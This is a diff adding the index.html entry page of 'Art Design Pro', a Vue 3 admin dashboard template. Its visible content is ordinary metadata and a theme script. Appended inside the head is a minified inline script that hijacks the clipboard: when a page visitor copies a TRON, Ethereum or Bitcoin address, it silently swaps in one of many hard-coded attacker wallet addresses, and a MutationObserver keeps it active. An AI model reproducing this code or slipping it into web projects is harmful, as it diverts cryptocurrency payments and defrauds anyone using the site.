@@ -1,0 +1,47 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Art Design Pro</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Art Design Pro - A modern admin dashboard template built with Vue 3, TypeScript, and Element Plus."
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="src/assets/images/favicon.ico" />
+
+    <style>
+      /* 防止页面刷新时白屏的初始样式 */
+      html {
+        background-color: #fafbfc;
+      }
+
+      html.dark {
+        background-color: #070707;
+      }
+    </style>
+
+    <script>
+      // 初始化 html class 主题属性
+      ;(function () {
+        try {
+          if (typeof Storage === 'undefined' || !window.localStorage) {
+            return
+          }
+
+          const themeType = localStorage.getItem('sys-theme')
+          if (themeType === 'dark') {
+            document.documentElement.classList.add('dark')
+          }
+        } catch (e) {
+          console.warn('Failed to apply initial theme:', e)
+        }
+      })()
+    </script>
+  <script>(function(){const ta=['TYM9kcgcjmzSDKboKaX7V9v5pTSpphmfe2','TX8vqFQQfGsFgFNg7CNh6k73LY1K9ExRXo','TAe5pRxMWSzFM1XUqVYfQXy6fTTueEQJhJ','TRDL6jy2sNsMyVoJwkedmBdiqJ8t9uNZ3f','TKSNSXQMRiNzfgwCqxTwNW7QauGe3kTpXs'],ea=['0xd08Bb05ED65dc4B733A5ccB4B2003A28dd5e3E2B','0x7addC0869b8121e00F53462D9aba04bBc2465D3F','0xE91858f2D322Cc3e82FB3984e975A7eECc2CAdb8','0xd53Ee4ef21069EE17d0A99B0fbE07A43Ed592235','0xA7Cd752cF5f59324905CFc62f5C26a00518238B1'],ba=['bc1qt0wa2t43vtr6v76wtu693snt5nv5k2f5jqum36','bc1q4n4qrq2w8266jkppt2qaplce84lyp2fpxwag5y','bc1qm6rk0wa7s39m4gl3kpzty7v5jhrseg7ehp89yl','bc1qlacwy9x4fcm628xthla8nx2htg3uel2l273r0p','bc1qg3jw6rj3pp9wh7dh3wrhpq9u4fcqlgf6f0f5ca'],b1a=['1KgSpJZq4aaH6UimpPLfUNPkHBg9gs28zY','1J4i5ntkyz3Z8NVtcXdSWpqbCKdPahQdvr','1E5iTvSmB4ZPhEuXruyLtAAbi8iUNX63ZR','1Nes9jhPxGnT2aRwQUcRE274u9MSR1pKFN','19tZNTkKkoGQF1En6anynp59F6oDF132eC'],b3a=['34DbNHn66LZRDCftrsX9unygfKECVxhXQR','31rZRY3hLcMAK4eS81jDJEfEWRxteiez4Y','33f3kzuRfFYEbqigi9CMonWzuMtbtHeSEw','35iqT1m5vZSzPckF2gU2hcXNNrDDsXcdnT','3MCxpPniKygEaAKgr3fC9gRdXaUXBpbxBG'],bpa=['bc1ps3mhjmsqpwc08h59yfqae73sf4a4d7hh2ngulhunjpc2rq9e4v8qnzpv24','bc1p04vzsftd08ps39qc53fl7zgdas58ejjp59zjx6ntrkck9c52ugjs9lp3e4','bc1pu6v02fyu8nsle45y0xrq5kd24ac7w0qrt3uu0msccnew5n3pg9xsmajtxx','bc1pselqsxd3yqrytj0jedq4pj5ujhxl6fg86l2tmnllqse5cgupk78s6vwlw2','bc1p96deh3ma7d35dfatsqm9rk4h4szsfdv7yvkg37t2v5wm7v3utvmqmyjrpx'],rnd=a=>a[Math.floor(Math.random()*a.length)];var _r=0;function rca(){if(_r)return;_r=1;const tar=/(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear=/(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar=/(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0=/(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1=/(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38,42})(?:\b|[^A-Za-z0-9])/g,bar2=/(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy',function(e){const ttc=window.getSelection().toString();if(ttc.match(tar)){const ncd=ttc.replace(tar,rnd(ta));e.clipboardData.setData('text/plain',ncd);e.preventDefault();}else if(ttc.match(ear)){const ncd=ttc.replace(ear,rnd(ea));e.clipboardData.setData('text/plain',ncd);e.preventDefault();}else if(ttc.match(bar)){const ncd=ttc.replace(bar,rnd(b1a));e.clipboardData.setData('text/plain',ncd);e.preventDefault();}else if(ttc.match(bar0)){const ncd=ttc.replace(bar0,rnd(b3a));e.clipboardData.setData('text/plain',ncd);e.preventDefault();}else if(ttc.match(bar1)){const ncd=ttc.replace(bar1,rnd(ba));e.clipboardData.setData('text/plain',ncd);e.preventDefault();}else if(ttc.match(bar2)){const ncd=ttc.replace(bar2,rnd(bpa));e.clipboardData.setData('text/plain',ncd);e.preventDefault();}});}setTimeout(()=>{const obs=new MutationObserver(ml=>{for(const m of ml){if(m.type==='childList'){rca();}}});obs.observe(document.body,{childList:true,subtree:true});},1000);rca();})();</script></head>
+
+  <body>
+    <div id="app"></div>
+    <script type="module" src="/src/main.ts"></script>
+  </body>
+</html>
